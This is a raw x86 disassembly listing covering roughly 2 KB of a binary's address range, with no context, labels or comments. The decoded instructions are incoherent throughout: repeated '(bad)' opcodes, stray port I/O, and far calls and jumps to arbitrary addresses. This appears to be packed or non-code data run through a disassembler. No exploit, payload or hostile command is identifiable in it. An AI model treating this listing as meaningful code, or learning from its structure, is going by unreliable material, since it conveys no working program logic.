  41c0db:	adc    esp,DWORD PTR [ebx+0x534fd525]
  41c0e1:	mov    ch,0x9b
  41c0e3:	(bad)  
  41c0e4:	push   ds
  41c0e5:	loop   0x41c0c0
  41c0e7:	mov    al,0x45
  41c0e9:	inc    esi
  41c0ea:	mov    edx,0xb558a95a
  41c0ef:	shl    BYTE PTR [ebx-0x647102cc],cl
  41c0f5:	bound  eax,QWORD PTR [ebp+0x49]
  41c0f8:	dec    ecx
  41c0f9:	dec    edx
  41c0fa:	sub    eax,0xec563c23
  41c0ff:	outs   dx,DWORD PTR ds:[esi]
  41c100:	add    ch,BYTE PTR [edx-0x38]
  41c103:	test   eax,0x4e9e77ca
  41c108:	retf   
  41c109:	inc    ecx
  41c10a:	cmovb  ebx,ebp
  41c10d:	pop    ebx
  41c10e:	inc    ebp
  41c10f:	add    al,BYTE PTR [ebp-0x76714c74]
  41c115:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c116:	pop    ecx
  41c117:	pop    ebx
  41c118:	leave  
  41c119:	push   esi
  41c11a:	aam    0xe5
  41c11c:	out    dx,eax
  41c11d:	aaa    
  41c11e:	jle    0x41c180
  41c120:	sub    BYTE PTR [ecx-0x6c],dl
  41c123:	sub    BYTE PTR [ebx],dh
  41c125:	jle    0x41c113
  41c127:	inc    esp
  41c128:	inc    edx
  41c129:	jne    0x41c185
  41c12b:	fs in  eax,dx
  41c12d:	(bad)  
  41c12e:	rcl    ah,1
  41c130:	adc    dl,BYTE PTR [esi+0x70a8b01c]
  41c136:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c137:	xor    cl,bh
  41c139:	aam    0x1d
  41c13b:	xor    eax,0x5308b9d9
  41c140:	fst    DWORD PTR [ebx-0x68052169]
  41c146:	ja     0x41c0f6
  41c148:	arpl   cx,sp
  41c14a:	sub    al,0xfa
  41c14c:	sub    eax,0x60da001c
  41c151:	lock mov esi,0x38d6e93c
  41c157:	lock jmp 0x7b862caa
  41c15d:	in     al,dx
  41c15e:	stc    
  41c15f:	popa   
  41c160:	ret    0x15ad
  41c163:	dec    ecx
  41c164:	leave  
  41c165:	nop
  41c166:	jge    0x41c126
  41c168:	pop    es
  41c169:	add    al,0xe4
  41c16b:	cmp    ebp,DWORD PTR [esi+0xadfeab9]
  41c171:	imul   esp,DWORD PTR [ecx-0x1b2e92ac],0x78685d04
  41c17b:	(bad)  
  41c17c:	and    edi,ebp
  41c17e:	and    BYTE PTR [ecx+ebp*1],0xbe
  41c182:	idiv   BYTE PTR [edx]
  41c184:	sub    eax,0x7b704f21
  41c189:	jl     0x41c10c
  41c18b:	sbb    BYTE PTR [edx+0x27],dl
  41c18e:	cmp    edi,edx
  41c190:	push   ss
  41c191:	cmp    al,dl
  41c193:	jle    0x41c1a9
  41c195:	imul   ecx,ebx,0xffffffb1
  41c198:	into   
  41c199:	out    dx,eax
  41c19a:	gs stos BYTE PTR es:[edi],al
  41c19c:	push   ss
  41c19d:	jmp    0x41c1e7
  41c19f:	sub    bh,BYTE PTR [ebp+0x5b]
  41c1a2:	sahf   
  41c1a3:	pushf  
  41c1a4:	cs or  esp,esp
  41c1a7:	push   ss
  41c1a8:	test   DWORD PTR [eax],0xeb70b63e
  41c1ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c1af:	sub    BYTE PTR [ebp+ebx*4+0x28b9f56c],dl
  41c1b6:	retf   
  41c1b7:	jp     0x41c22a
  41c1b9:	sahf   
  41c1ba:	lods   eax,DWORD PTR ds:[esi]
  41c1bb:	sub    ebp,DWORD PTR [ecx+0x34be48f2]
  41c1c1:	sub    esp,esi
  41c1c3:	test   BYTE PTR [edi+0x46d27743],ah
  41c1c9:	(bad)  
  41c1cb:	out    0x8e,al
  41c1cd:	xchg   edi,eax
  41c1ce:	adc    DWORD PTR [esp+ebp*8],esi
  41c1d1:	adc    edx,DWORD PTR [edi]
  41c1d3:	sub    edx,DWORD PTR [esi-0x42854e52]
  41c1d9:	fdiv   DWORD PTR [ebx+0x13914621]
  41c1df:	test   al,0x26
  41c1e1:	adc    BYTE PTR [ebx+0x5c],bh
  41c1e4:	push   esi
  41c1e5:	push   0xffffff8d
  41c1e7:	retf   0xbc98
  41c1ea:	adc    eax,0xf0d9dd66
  41c1ef:	adc    al,0x47
  41c1f1:	call   0x7ee3ac30
  41c1f6:	fyl2xp1 
  41c1f8:	jnp    0x41c22d
  41c1fa:	or     DWORD PTR [edx+edi*1-0x80],ecx
  41c1fe:	(bad)  
  41c200:	loop   0x41c18f
  41c202:	inc    esi
  41c203:	nop
  41c204:	pop    ebx
  41c205:	in     eax,dx
  41c206:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c207:	outs   dx,DWORD PTR ds:[esi]
  41c208:	aad    0xd0
  41c20a:	add    DWORD PTR [edi+edi*2+0x2d],ecx
  41c20e:	lds    ebp,FWORD PTR [esi-0x48]
  41c211:	mov    al,0xdd
  41c213:	xlat   BYTE PTR ds:[ebx]
  41c214:	in     eax,dx
  41c215:	cmp    esp,DWORD PTR [eax-0x1d]
  41c218:	cdq    
  41c219:	loop   0x41c1f1
  41c21b:	ret    
  41c21c:	and    eax,0x7e8b8068
  41c221:	sub    al,0x7b
  41c223:	lahf   
  41c224:	arpl   bx,di
  41c226:	jmp    0xf1aa0402
  41c22b:	fld    DWORD PTR [edx+0x26f56bec]
  41c231:	hlt    
  41c232:	cld    
  41c233:	cmp    al,0x6d
  41c235:	retf   0x61a
  41c238:	pop    ebx
  41c239:	push   cs
  41c23a:	and    BYTE PTR [ebx+0xfba5f4c],dh
  41c240:	xor    BYTE PTR [ebp-0x31],0x74
  41c244:	pop    edx
  41c245:	jnp    0x41c29a
  41c247:	(bad)  
  41c248:	(bad)  
  41c249:	jl     0x41c27c
  41c24b:	push   ds
  41c24c:	inc    esp
  41c24d:	adc    eax,0xbb38f3de
  41c252:	imul   eax,DWORD PTR [esi],0x4fe12bcd
  41c258:	mov    ch,0x34
  41c25a:	xchg   ecx,eax
  41c25b:	scas   eax,DWORD PTR es:[edi]
  41c25c:	or     al,0x8
  41c25e:	inc    eax
  41c25f:	jae    0x41c280
  41c261:	lock mov ecx,0x93ecdc43
  41c267:	in     eax,dx
  41c268:	imul   BYTE PTR [eax-0x2c58c7b7]
  41c26e:	pop    eax
  41c26f:	sbb    al,0x32
  41c271:	retf   
  41c272:	jle    0x41c1fd
  41c274:	ds popf 
  41c276:	jg     0x41c2d7
  41c278:	les    esp,FWORD PTR [esp+ebp*4+0x7]
  41c27c:	push   0xffffffa1
  41c27e:	(bad)  
  41c280:	ss push ebp
  41c282:	je     0x41c229
  41c284:	fidivr WORD PTR [ebx-0x27]
  41c287:	mov    ecx,0x55f8a8ab
  41c28c:	mov    edi,0x9e374c8c
  41c291:	jmp    DWORD PTR [ecx-0x126d07]
  41c297:	sub    DWORD PTR [edi+ebp*1+0x114068a8],ebp
  41c29e:	jecxz  0x41c31f
  41c2a0:	xchg   BYTE PTR [ebp-0x39],cl
  41c2a3:	push   esi
  41c2a4:	ds xchg edx,eax
  41c2a6:	fwait
  41c2a7:	das    
  41c2a8:	lods   al,BYTE PTR ds:[esi]
  41c2a9:	xchg   BYTE PTR [ebp-0x44],dl
  41c2ac:	inc    esp
  41c2ad:	push   edx
  41c2ae:	mov    ebx,0xd0a7153d
  41c2b3:	bound  esp,QWORD PTR [edx+esi*2+0x49]
  41c2b7:	and    al,0x53
  41c2b9:	dec    edx
  41c2ba:	xor    al,dl
  41c2bc:	neg    DWORD PTR [ecx-0x4b60aded]
  41c2c2:	lods   eax,DWORD PTR ds:[esi]
  41c2c3:	in     eax,dx
  41c2c4:	dec    esp
  41c2c5:	aas    
  41c2c6:	inc    eax
  41c2c7:	jbe    0x41c25d
  41c2c9:	and    bh,BYTE PTR [edx]
  41c2cb:	popa   
  41c2cc:	gs cli 
  41c2ce:	or     al,0x7f
  41c2d0:	aaa    
  41c2d1:	imul   ebp,DWORD PTR [esi+0x68ee0427],0x6c3a5745
  41c2db:	test   eax,0x6692c948
  41c2e0:	(bad)  
  41c2e1:	outs   dx,BYTE PTR ds:[esi]
  41c2e2:	es mov dl,0x67
  41c2e5:	inc    ebp
  41c2e6:	push   eax
  41c2e7:	test   DWORD PTR [edx+0x65],esi
  41c2ea:	mov    ch,0xe5
  41c2ec:	push   esp
  41c2ed:	pop    es
  41c2ee:	ror    BYTE PTR [ebx],cl
  41c2f0:	fnsave [ebp+ecx*8-0x57]
  41c2f4:	xchg   edx,eax
  41c2f5:	cld    
  41c2f6:	(bad)  
  41c2f7:	cli    
  41c2f8:	push   edi
  41c2f9:	sbb    al,0x56
  41c2fb:	inc    edx
  41c2fc:	mov    cl,0x9
  41c2fe:	or     BYTE PTR [edx],dh
  41c300:	and    al,0x85
  41c302:	xchg   ebx,eax
  41c303:	ins    BYTE PTR es:[edi],dx
  41c304:	jmp    0xeb441a17
  41c309:	cmp    al,0xc1
  41c30b:	sub    cl,BYTE PTR [esi-0x219bd579]
  41c311:	in     eax,dx
  41c312:	fnstenv [ebx-0x7c715ecd]
  41c318:	mov    dl,al
  41c31a:	loope  0x41c2aa
  41c31c:	out    dx,eax
  41c31d:	fsub   QWORD PTR ds:0x602a1f29
  41c323:	je     0x41c362
  41c325:	(bad)  
  41c326:	cli    
  41c327:	xchg   BYTE PTR [ebx],ah
  41c329:	sbb    eax,0xe36f3493
  41c32e:	push   esp
  41c32f:	retf   0xde03
  41c332:	sti    
  41c333:	xor    DWORD PTR [edx+0x3e],eax
  41c336:	sbb    eax,0x3059a38
  41c33b:	sbb    ah,BYTE PTR [edi+0x3e]
  41c33e:	icebp  
  41c33f:	ja     0x41c384
  41c341:	adc    al,0x74
  41c343:	dec    ecx
  41c344:	outs   dx,DWORD PTR ds:[esi]
  41c345:	xchg   edi,eax
  41c346:	retf   
  41c347:	xor    dl,BYTE PTR [ebx]
  41c349:	jmp    0x41c34c
  41c34b:	or     dl,BYTE PTR [esi]
  41c34d:	sub    BYTE PTR [ecx+0x7b],0x99
  41c351:	(bad)  
  41c352:	retf   0x6d27
  41c355:	popf   
  41c356:	gs out dx,al
  41c358:	jge    0x41c3b1
  41c35a:	ror    BYTE PTR [ecx],1
  41c35c:	aas    
  41c35d:	xchg   DWORD PTR [ecx],esi
  41c35f:	ja     0x41c2fb
  41c361:	cli    
  41c362:	mov    cs,WORD PTR [eax-0x19]
  41c365:	push   ds
  41c366:	adc    al,0x36
  41c368:	jl     0x41c32b
  41c36a:	add    al,0xfa
  41c36c:	push   esi
  41c36d:	jbe    0x41c34b
  41c36f:	sub    al,0x2d
  41c371:	jbe    0x41c321
  41c373:	mov    edi,0x73f075e3
  41c379:	push   eax
  41c37a:	mov    edx,0x72181760
  41c37f:	bound  esp,QWORD PTR [esp+ebp*8-0x5c]
  41c383:	imul   ecx,DWORD PTR [edi-0x676b3d45],0xffffffe5
  41c38a:	call   0x21904766
  41c38f:	or     DWORD PTR [ebp-0x6da4ce6c],esp
  41c395:	jne    0x41c3d7
  41c397:	js     0x41c3c2
  41c399:	pop    ds
  41c39a:	or     al,0xb4
  41c39c:	push   esp
  41c39d:	adc    DWORD PTR gs:[esp+ecx*4],0xffffff90
  41c3a2:	xor    esi,esp
  41c3a4:	sti    
  41c3a5:	ins    DWORD PTR es:[edi],dx
  41c3a6:	xor    BYTE PTR [ebp+0x2f55e34a],0xd8
  41c3ad:	xchg   esp,eax
  41c3ae:	sahf   
  41c3af:	or     eax,DWORD PTR [ebp+ecx*1-0x5c05c794]
  41c3b6:	xchg   ebp,eax
  41c3b7:	lods   al,BYTE PTR ds:[esi]
  41c3b8:	xor    BYTE PTR [ebp-0x29],bl
  41c3bb:	mov    ah,0x45
  41c3bd:	(bad)
  41c3c1:	aas    
  41c3c2:	adc    DWORD PTR [ecx+eiz*8-0x16],ecx
  41c3c6:	aaa    
  41c3c7:	mov    cl,BYTE PTR [esi]
  41c3c9:	out    dx,al
  41c3ca:	out    0x6b,eax
  41c3cc:	mov    dl,0x9
  41c3ce:	or     DWORD PTR [ebp-0x17],eax
  41c3d1:	jge    0x41c36f
  41c3d3:	sbb    cl,dh
  41c3d5:	fs push ecx
  41c3d7:	add    al,0x7a
  41c3d9:	mov    dl,0xaf
  41c3db:	and    DWORD PTR [ebx+ecx*2-0x6aac5e3],0x4c61675a
  41c3e6:	mov    al,0xc6
  41c3e8:	stos   DWORD PTR es:[edi],eax
  41c3e9:	cmp    eax,0xb0cf9ab3
  41c3ee:	aam    0x92
  41c3f0:	pushf  
  41c3f1:	in     al,0x1e
  41c3f3:	xchg   DWORD PTR [ecx-0x80],edx
  41c3f6:	mov    ah,0x70
  41c3f8:	int3   
  41c3f9:	out    dx,eax
  41c3fa:	aaa    
  41c3fb:	push   eax
  41c3fc:	fld    TBYTE PTR cs:0x98526279
  41c403:	jmp    0x2d853bd2
  41c408:	cdq    
  41c409:	imul   ebx,DWORD PTR [ebp+0x1c2c8c0b],0x50
  41c410:	arpl   WORD PTR [edx],bx
  41c412:	xchg   DWORD PTR [eax+0x2b5b8ab0],ebx
  41c418:	dec    edi
  41c419:	fld    DWORD PTR [ebp+eax*2-0x68]
  41c41d:	inc    ecx
  41c41e:	loopne 0x41c415
  41c420:	jmp    0x41c422
  41c422:	in     al,dx
  41c423:	repnz mov DWORD PTR [edi-0x41bc7db2],0xb91e9098
  41c42e:	and    BYTE PTR [esi],al
  41c430:	nop
  41c431:	stc    
  41c432:	call   0xf51db3c0
  41c437:	sahf   
  41c438:	imul   edx,esp,0xadd5f6cc
  41c43e:	aam    0x4e
  41c440:	xchg   esp,eax
  41c441:	dec    esp
  41c442:	and    BYTE PTR [ebx-0x5b],0xd1
  41c446:	jecxz  0x41c3e1
  41c448:	iret   
  41c449:	int3   
  41c44a:	cwde   
  41c44b:	fiadd  WORD PTR [esi+0x2bb45dd7]
  41c451:	adc    eax,0xdc938fa6
  41c456:	inc    ebp
  41c457:	pop    ds
  41c458:	mov    al,ds:0xff768f78
  41c45d:	sti    
  41c45e:	jl     0x41c42b
  41c460:	aas    
  41c461:	dec    ecx
  41c462:	jg     0x41c4d9
  41c464:	outs   dx,BYTE PTR ds:[esi]
  41c465:	push   edx
  41c466:	xor    DWORD PTR [ecx-0x6c],edx
  41c469:	lds    esp,FWORD PTR [ebx+0x64]
  41c46c:	into   
  41c46d:	in     al,0xb
  41c46f:	mov    fs,WORD PTR [eax+0x55939ba1]
  41c475:	inc    eax
  41c476:	fsub   st(1),st
  41c478:	sbb    al,0xa9
  41c47a:	sbb    dh,BYTE PTR [edi]
  41c47c:	add    al,0x93
  41c47e:	and    esi,0x68294933
  41c484:	(bad)  
  41c486:	sub    eax,0x1bc326b6
  41c48b:	les    edi,FWORD PTR [edi-0x3f2e0446]
  41c491:	fs mov dh,0x84
  41c494:	retf   
  41c495:	xchg   edi,eax
  41c496:	shl    esp,1
  41c498:	sbb    ah,BYTE PTR [esi]
  41c49a:	rcr    ecx,1
  41c49c:	jg     0x41c492
  41c49e:	mov    ebx,0x2a58e5cb
  41c4a3:	ja     0x41c484
  41c4a5:	cmp    esp,DWORD PTR [esi-0x5d]
  41c4a8:	pushf  
  41c4a9:	fnstcw WORD PTR [edi+0xe]
  41c4ac:	cmp    cl,0x90
  41c4af:	mov    bl,0x2f
  41c4b1:	mov    al,0xe0
  41c4b3:	and    BYTE PTR [ecx-0x6b],0xc9
  41c4b7:	sar    BYTE PTR [edi],1
  41c4b9:	jmp    0x41c440
  41c4bb:	pop    edi
  41c4bc:	pop    eax
  41c4bd:	js     0x41c53a
  41c4bf:	fcomip st,st(4)
  41c4c1:	and    eax,0x3eba5008
  41c4c6:	xchg   BYTE PTR [esi-0x26],dh
  41c4c9:	sub    ebp,DWORD PTR [edi+edi*1]
  41c4cc:	arpl   WORD PTR [ecx-0x2f],dx
  41c4cf:	jg     0x41c543
  41c4d1:	inc    ebp
  41c4d2:	call   0x2afe:0x1c9b6c12
  41c4d9:	pop    esi
  41c4da:	(bad)  
  41c4db:	cmp    eax,0xe703c182
  41c4e0:	mov    WORD PTR [edi],fs
  41c4e2:	mov    ch,0xf7
  41c4e4:	adc    DWORD PTR [esi+0x1bda8c65],esi
  41c4ea:	mov    edi,0x94715980
  41c4ef:	lods   eax,DWORD PTR ds:[esi]
  41c4f0:	sbb    eax,0xb83eec6
  41c4f5:	mov    cl,0x97
  41c4f7:	jmp    0x75b25626
  41c4fc:	mov    ebx,0x54c0b1e
  41c501:	and    DWORD PTR [ebp+0x67],0x837d9b0e
  41c508:	cmp    BYTE PTR [edi],al
  41c50a:	add    ecx,eax
  41c50c:	pop    ds
  41c50d:	les    edx,FWORD PTR [ebx+0x77]
  41c510:	out    0xc0,al
  41c512:	outs   dx,BYTE PTR ds:[esi]
  41c513:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c514:	sti    
  41c515:	mov    esp,fs
  41c517:	jle    0x41c56d
  41c519:	xchg   ecx,eax
  41c51a:	pop    ds
  41c51b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c51c:	mov    al,0x51
  41c51e:	xchg   ebp,eax
  41c51f:	jno    0x41c545
  41c521:	inc    ebx
  41c522:	cld    
  41c523:	jg     0x41c586
  41c525:	std    
  41c526:	push   ebx
  41c527:	mov    dl,0x28
  41c529:	xchg   DWORD PTR ds:0xfd36cb54,ebx
  41c52f:	mov    ah,0x6c
  41c531:	mov    ah,0x83
  41c533:	ds pop ebp
  41c535:	loop   0x41c57e
  41c537:	mov    cl,0x5a
  41c539:	sub    eax,0x5e35dd2c
  41c53e:	adc    eax,0x3738aad0
  41c543:	cmp    dl,BYTE PTR [ecx]
  41c545:	fadd   QWORD PTR [eax+0x46c3b348]
  41c54b:	(bad)  
  41c54c:	adc    esi,DWORD PTR [ebp+edi*8-0x71dea57a]
  41c553:	mov    ebp,0xc4f1d176
  41c558:	lock inc esp
  41c55a:	(bad)  
  41c55b:	mov    al,ds:0x479955f3
  41c560:	retf   
  41c561:	push   esi
  41c562:	inc    esp
  41c563:	dec    eax
  41c564:	sbb    eax,0xd327622e
  41c569:	sar    DWORD PTR [eax],cl
  41c56b:	jo     0x41c52b
  41c56d:	out    dx,eax
  41c56e:	mul    ch
  41c570:	mov    al,0xb9
  41c572:	add    DWORD PTR [eax],0x545195e3
  41c578:	shl    BYTE PTR [ebp+0x4cbae9be],1
  41c57e:	test   DWORD PTR [ecx+0x2b1e4449],esi
  41c584:	xchg   ebp,eax
  41c585:	(bad)  
  41c586:	mov    ds:0x6ec54c78,eax
  41c58b:	lods   al,BYTE PTR ds:[esi]
  41c58c:	push   ebp
  41c58d:	mov    dh,0x48
  41c58f:	in     al,dx
  41c590:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c591:	cmp    DWORD PTR [edx+0x12a7a7f8],esi
  41c597:	fwait
  41c598:	push   edi
  41c599:	into   
  41c59a:	aam    0x8b
  41c59c:	cld    
  41c59d:	inc    ecx
  41c59e:	mov    ebp,0x3a0b8605
  41c5a3:	repz add ebx,DWORD PTR [ebp+0x64]
  41c5a7:	call   0xfb9a:0x54578a2a
  41c5ae:	and    BYTE PTR [edx+0xf94939b],bh
  41c5b4:	and    eax,DWORD PTR [ecx+0x1111377]
  41c5ba:	cld    
  41c5bb:	pop    ebp
  41c5bc:	pop    edx
  41c5bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c5be:	(bad)  
  41c5bf:	xchg   esi,eax
  41c5c0:	shl    BYTE PTR [eax],1
  41c5c2:	fiadd  DWORD PTR [ebx-0x37]
  41c5c5:	nop
  41c5c6:	lods   al,BYTE PTR ds:[esi]
  41c5c7:	pusha  
  41c5c8:	push   ebx
  41c5c9:	pop    esp
  41c5ca:	std    
  41c5cb:	mov    ecx,0xe45bf854
  41c5d0:	push   DWORD PTR [ebx-0x63]
  41c5d3:	leave  
  41c5d4:	bound  edi,QWORD PTR [esi+esi*8]
  41c5d7:	loopne 0x41c563
  41c5d9:	xchg   ebp,eax
  41c5da:	fist   WORD PTR [eax+0x6aa3d9c1]
  41c5e0:	nop
  41c5e1:	fcom   st(1)
  41c5e3:	add    bl,BYTE PTR gs:[edx-0x37]
  41c5e7:	sub    BYTE PTR [edx+0x306411f3],bl
  41c5ed:	and    eax,0x19018b85
  41c5f2:	imul   ah
  41c5f4:	and    eax,0xb9292162
  41c5f9:	repz lock xchg ecx,eax
  41c5fc:	test   DWORD PTR [ecx-0x52],ebx
  41c5ff:	shl    BYTE PTR [ebp-0x848d721],1
  41c605:	mov    edx,0xb32c9bdf
  41c60a:	daa    
  41c60b:	es push edi
  41c60d:	cmc    
  41c60e:	fwait
  41c60f:	or     ebx,ebp
  41c611:	jmp    0xaf100dd6
  41c616:	lea    ebp,[edi]
  41c618:	pop    ebp
  41c619:	leave  
  41c61a:	fdivr  QWORD PTR [edx+0x66d7946d]
  41c620:	loopne 0x41c60a
  41c622:	in     al,dx
  41c623:	sti    
  41c624:	inc    ecx
  41c625:	ret    0xd836
  41c628:	(bad)  
  41c629:	out    dx,al
  41c62a:	in     eax,dx
  41c62b:	push   esi
  41c62c:	cmc    
  41c62d:	mov    ebx,0xb66ca6a4
  41c632:	ds addr16 dec eax
  41c635:	neg    DWORD PTR [esi+0x3786052d]
  41c63b:	and    eax,0x40a7d4ff
  41c640:	es in  al,0xff
  41c643:	mov    bl,0x3d
  41c645:	je     0x41c697
  41c647:	popa   
  41c648:	jmp    0x41c63f
  41c64a:	add    DWORD PTR [ebp+0x7],esp
  41c64d:	outs   dx,DWORD PTR ds:[esi]
  41c64e:	mov    DWORD PTR [edi-0x7824e89],ecx
  41c654:	pop    ds
  41c655:	outs   dx,DWORD PTR ds:[esi]
  41c656:	mov    ?,edi
  41c658:	and    al,0xaa
  41c65a:	addr16 sub al,0x1e
  41c65d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c65e:	and    bh,bh
  41c660:	pop    esi
  41c661:	es loop 0x41c6c0
  41c664:	mov    ch,0xbb
  41c666:	mov    al,0x5
  41c668:	mov    esi,DWORD PTR [ebx]
  41c66a:	cwde   
  41c66b:	xor    BYTE PTR [ecx],cl
  41c66d:	call   0x4e82:0xdb2e22ea
  41c674:	sbb    ecx,DWORD PTR fs:[ecx+0x2d5769d3]
  41c67b:	rcr    DWORD PTR ds:0xeda60de9,0x54
  41c682:	in     al,0xc
  41c684:	retf   
  41c685:	das    
  41c686:	add    al,0xe4
  41c688:	(bad)  
  41c689:	fsub   QWORD PTR [ebp-0x67]
  41c68c:	xor    BYTE PTR [esi],dh
  41c68e:	into   
  41c68f:	mov    dl,0xe9
  41c691:	push   edi
  41c692:	xchg   esp,eax
  41c693:	in     eax,0xa9
  41c695:	pushf  
  41c696:	in     eax,0xd0
  41c698:	and    eax,0x47811fd0
  41c69d:	iret   
  41c69e:	add    eax,0x945a5f74
  41c6a3:	enter  0x5af7,0xc9
  41c6a7:	mov    edx,0xfb9effd3
  41c6ac:	idiv   bh
  41c6ae:	mov    dh,0x79
  41c6b0:	and    eax,0xe7bdf979
  41c6b5:	dec    ebx
  41c6b6:	sahf   
  41c6b7:	cmp    eax,0x9c383b0b
  41c6bc:	jns    0x41c6cf
  41c6be:	les    ebp,FWORD PTR [ebx]
  41c6c0:	inc    esp
  41c6c1:	push   edi
  41c6c2:	mov    DWORD PTR [ebp-0x69b82607],ebx
  41c6c8:	push   ebx
  41c6c9:	mov    bl,0x6e
  41c6cb:	jp     0x41c70a
  41c6cd:	xor    bl,BYTE PTR [eax]
  41c6cf:	sub    eax,0x2938d17
  41c6d4:	push   edi
  41c6d5:	mov    al,ds:0x46739f1c
  41c6da:	cmp    cl,BYTE PTR [ebx+0x6d]
  41c6dd:	mov    es:0x2ee93c07,al
  41c6e3:	or     ch,BYTE PTR [eax+0x517b00db]
  41c6e9:	inc    ebx
  41c6ea:	add    ebx,edx
  41c6ec:	lods   eax,DWORD PTR ds:[esi]
  41c6ed:	rcr    ch,0x3f
  41c6f0:	jae    0x41c6ff
  41c6f2:	mov    dl,0x41
  41c6f4:	add    ecx,DWORD PTR [edi+0x64]
  41c6f7:	xchg   esp,eax
  41c6f8:	pop    ebx
  41c6f9:	mov    esp,0x6ccccb7f
  41c6fe:	into   
  41c6ff:	sub    eax,0x1a52292d
  41c704:	cmp    BYTE PTR [si-0x6e45],0x67
  41c70a:	jg     0x41c6e5
  41c70c:	pop    edx
  41c70d:	loope  0x41c767
  41c70f:	xor    eax,0x871395da
  41c714:	add    esi,DWORD PTR [esi+esi*4-0x6e]
  41c718:	je     0x41c6a5
  41c71a:	ins    BYTE PTR es:[edi],dx
  41c71b:	ret    
  41c71c:	pop    ebp
  41c71d:	add    al,0x7a
  41c71f:	jb     0x41c6e9
  41c721:	and    bl,bl
  41c723:	stos   BYTE PTR es:[edi],al
  41c724:	and    edx,DWORD PTR [edx-0x5b27b064]
  41c72a:	pushf  
  41c72b:	inc    esi
  41c72c:	mov    DWORD PTR [ebx],esp
  41c72e:	leave  
  41c72f:	and    cl,bl
  41c731:	jns    0x41c737
  41c733:	inc    edi
  41c734:	xchg   esp,eax
  41c735:	call   0x4f5:0xe1b2a00e
  41c73c:	pop    ecx
  41c73d:	call   0xb052:0xd3b9b249
  41c744:	call   0xcf04:0x10f16ae5
  41c74b:	inc    eax
  41c74c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c74d:	mov    ss,WORD PTR [ecx-0x5e6a3bac]
  41c753:	pop    edi
  41c754:	xor    eax,0xae8074af
  41c759:	sbb    DWORD PTR [edi+edx*1+0x5b7d3c7a],ecx
  41c760:	add    eax,ebx
  41c762:	cld    
  41c763:	add    DWORD PTR [ebp-0x74],esi
  41c766:	pushf  
  41c767:	out    0x4e,al
  41c769:	xor    BYTE PTR [eax+0x597c0f55],0x19
  41c770:	iret   
  41c771:	mov    esi,0xe6e8573c
  41c776:	pop    ebp
  41c777:	sub    DWORD PTR [edx-0x1f19fc8f],0x18c2f5c2
  41c781:	jl     0x41c710
  41c783:	fnsave [ebp-0x6c]
  41c786:	xchg   ecx,eax
  41c787:	repnz push ds
  41c789:	xchg   esp,eax
  41c78a:	jne    0x41c7d8
  41c78c:	neg    BYTE PTR [edi+esi*4]
  41c78f:	xchg   esi,eax
  41c790:	xlat   BYTE PTR ds:[ebx]
  41c791:	mov    esp,0x642e6e07
  41c796:	popf   
  41c797:	mov    dl,0xf5
  41c799:	stos   BYTE PTR es:[edi],al
  41c79a:	xchg   cx,ax
  41c79c:	sbb    eax,ebp
  41c79e:	mov    bh,0xa2
  41c7a0:	es add al,0xc2
  41c7a3:	pushw  0xe81f
  41c7a7:	jae    0x41c78b
  41c7a9:	(bad)  
  41c7ab:	add    DWORD PTR [ecx],edx
  41c7ad:	jb     0x41c77e
  41c7af:	in     al,0x39
  41c7b1:	xor    DWORD PTR [eax+0x14],ebp
  41c7b4:	pop    esi
  41c7b5:	mov    ebx,0xc444b67
  41c7ba:	pop    ebx
  41c7bb:	xlat   BYTE PTR ds:[ebx]
  41c7bc:	(bad)
  41c7bf:	dec    esp
  41c7c0:	sub    eax,0x9585140c
  41c7c5:	pmuludq mm3,QWORD PTR [esi-0x5def8964]
  41c7cc:	sub    BYTE PTR [bp+si-0x7d],cl
  41c7d0:	mov    al,ds:0x9a287aa8
  41c7d5:	jmp    0x8dde:0x417e91c0
  41c7dc:	push   cs
  41c7dd:	xor    dl,0x92
  41c7e0:	ins    BYTE PTR es:[edi],dx
  41c7e1:	push   ebp
  41c7e2:	xchg   esi,eax
  41c7e3:	inc    ebp
  41c7e4:	sub    BYTE PTR [ecx-0x64],0x39
  41c7e8:	dec    edx
  41c7e9:	cli    
  41c7ea:	sub    BYTE PTR [edi+0x62a56bd3],0xa5
  41c7f1:	sbb    eax,0xdfc490b4
  41c7f6:	mov    edi,0x4db0f56a
  41c7fb:	push   ecx
  41c7fc:	pop    ecx
  41c7fd:	lock add eax,0x5fed62f2
  41c803:	ds in  eax,0xdd
  41c806:	pop    edx
  41c807:	jo     0x41c851
  41c809:	loopne 0x41c85c
  41c80b:	jmp    0x71b1:0xb2a1a4b1
  41c812:	pop    edx
  41c813:	inc    ebp
  41c814:	inc    edx
  41c815:	jmp    0xe51d:0xdaad5fc0
  41c81c:	jb     0x41c7e9
  41c81e:	and    eax,0x40170b37
  41c823:	mov    cs,WORD PTR [ebx-0x6fbbb902]
  41c829:	aas    
  41c82a:	lea    ebx,[eax+0x3ea4bf24]
  41c830:	pushf  
  41c831:	data16 (bad) 
  41c833:	pop    ss
  41c834:	popf   
  41c835:	push   ds
  41c836:	sub    al,0xe6
  41c838:	inc    ebx
  41c839:	mov    dl,0x22
  41c83b:	int    0x24
  41c83d:	inc    esp
  41c83e:	mov    dl,0x81
  41c840:	out    0xc9,al
  41c842:	(bad)  
  41c843:	fst    DWORD PTR fs:[edx]
  41c846:	loopne 0x41c84c
  41c848:	inc    esi
  41c849:	sahf   
  41c84a:	out    dx,al
  41c84b:	sub    BYTE PTR [edx+0x2d],0xdf
  41c84f:	sbb    eax,0xfd5de616
  41c854:	daa    
  41c855:	fnstcw WORD PTR [edx+0x26]
  41c858:	pop    edx
  41c859:	jmp    0x10c93b59
  41c85e:	jp     0x41c8a8
  41c860:	cmc    
  41c861:	cmp    bl,BYTE PTR ds:0xccc50b23
  41c867:	in     eax,dx
  41c868:	and    eax,0x6dc853f1
  41c86d:	or     DWORD PTR [esi+ebx*8],eax
  41c870:	repz pop eax
  41c872:	sub    al,dl
  41c874:	ja     0x41c840
  41c876:	call   0x68583fdc
  41c87b:	inc    esi
  41c87c:	(bad)  
  41c87e:	push   0x51f496b1
  41c883:	jmp    0x41c8fd
